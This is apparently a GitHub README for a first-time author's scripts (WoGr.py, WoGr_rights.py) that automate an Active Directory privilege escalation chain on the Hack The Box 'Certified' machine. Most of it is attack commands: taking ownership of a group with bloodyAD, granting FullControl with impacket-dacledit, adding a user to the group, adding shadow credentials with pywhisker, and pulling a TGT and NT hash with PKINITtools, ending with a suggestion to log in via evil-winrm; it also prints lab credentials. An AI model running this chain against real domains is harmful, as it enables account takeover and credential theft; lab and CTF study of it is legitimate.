# Script for lazy people (_SfLp_)


## ⚠️ WARNING: This script is intended **for lab/testing purposes only** (e.g., Hack The Box, CTFs). Do **not** run this against any production or unauthorized systems.





### This script automate the WriteOwner -> Group -> GenericWrite


#### How to use the script 

#### You will use WoGr.py // and WoGr_rights.py 

<img width="698" height="245" alt="image" src="https://github.com/user-attachments/assets/fc760e9e-87a8-458b-9951-ca4a0901486b" />


<img width="741" height="186" alt="image" src="https://github.com/user-attachments/assets/72030468-6d11-4b7f-b45c-1036c05f60de" />



1) Chmod
```
chmod +x WoGr.py WoGr_rights.py
```
2) Run WoGr.py

```
python3 WoGr.py -u USER -p PASSWORD -d DOMAIN -t TARGET --dc DC [--exp EXP]
```
2 ) exp
```
python3 WoGr.py -u judith.mader -p judith09 -d certified.htb -t management_svc --dc 10.10.11.41 --exp "management_svc.ccache"
```
2 ) If script get the error "INSUFF_ACCESS_RIGHTS" run WoGr_rights.py

<img width="1420" height="376" alt="image" src="https://github.com/user-attachments/assets/dc4fd7dd-58a9-47eb-81c6-cf5bc6c7e182" />

3 )  run WoGr_rights.py 

```
python3 WoGr_rights.py -target_group TARGET_GROUP
```
3 ) exp
```
python3 WoGr_rights.py -target_group management 
```
4 ) Run WoGr.py . And you will get the NT hash for the target 

<img width="467" height="43" alt="image" src="https://github.com/user-attachments/assets/deb13f2e-1a9c-47bc-ab21-5b79d524fdde" />

After that you can run evil winrm :) , have fun 

# EXP

<img width="1201" height="370" alt="image" src="https://github.com/user-attachments/assets/cef31768-6ec0-4bdc-9011-1ddb34d13de4" />

 - 1 User -> we use with WoGr.py : -u , -p 
 - 2 Group -> we use with WoGr_rights.py : -target_group
 - 3 User we want -> we use with WoGr.py : -t , --exp 


----
----
----

# I need to mentionate this it s my first script ... , tested by me on "HTB Certified" the script run a serias of command who get you the NT hash

# The WoGr.py run 

1) nxc for host file 
```
nxc smb <$IP> --generate-hosts-file host_script
```
1.2) And make a creds folder who store all the creds who you give to him

2) Abuse GenericWrite acl to get control of the <User_we_want > account
```
python3 pywhisker.py -d "<dc>" -u "<name>" -p "<pass>" --target "<target user>" --action "add"
```

3) We use faketime for set the curent time of the machine and use gettgtpkinit with the .pfx , pass generated by the pywhisker  
```
faketime "$(ntpdate -q <IP> | cut -d " " -f 1,2)" python3 PKINITtools/gettgtpkinit.py -cert-pfx <file.pfx> certified.htb/management_svc -pfx-pass "<pass(pfx)>" <target user>.ccache
```
4) After he found the AS-REP we use it with faketime and getnthash from PKINITtools to get the NT Hash 
```
faketime "$(ntpdate -q <IP> | cut -d " " -f 1,2)" python3 PKINITtools/getnthash.py -key <key> <dc>/<target user>
```
5) At the end we remove all .pem / .pfx file


# The WoGr_rights.py run 

1) Set owner group 

```
bloodyAD --host "<ip>" -d "<dc>" -u "<name>" -p "<pass>" set owner <group> <name>
```
2) DACL modify
```
impacket-dacledit -action write -rights "FullControl" -inheritance -principal "<user>" -target "<group>" "<dc>/<user>:<pass>"
```
3) Add to the target group
```
net rpc group addmem "management" "<user>" -U "<dc>/<user>%<pass>" -S "<FullDc>"
```
